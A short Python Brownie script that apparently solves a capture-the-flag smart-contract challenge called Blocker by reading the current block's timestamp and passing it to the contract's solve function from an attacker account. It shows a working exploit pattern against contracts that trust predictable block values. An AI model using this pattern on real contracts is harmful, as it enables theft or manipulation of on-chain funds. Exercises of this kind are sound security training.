from brownie import Blocker, web3 as w3, chain
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack(contract_address=None, attacker=None):
    if not contract_address:
        blocker_contract, owner = deploy()
        contract_address = blocker_contract.address
        # ? Geeting the accounst for local testing
        _, attacker = get_account()
    # print(contract_address)
    blocker_contract = Blocker.at(contract_address)
    print(f"{green}Is solved: {red}{blocker_contract.solved()}{red}{reset}")

    block_num = w3.eth.block_number
    block_value = w3.eth.get_block(block_num - 1)["hash"].hex()
    # print(chain[block_num]["timestamp"])
    time_stamp = chain[block_num]["timestamp"]

    blocker_contract.solve(time_stamp, {"from": attacker})

    print(f"{green}Is solved: {red}{blocker_contract.solved()}{red}{reset}")


def main(contract_address=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()
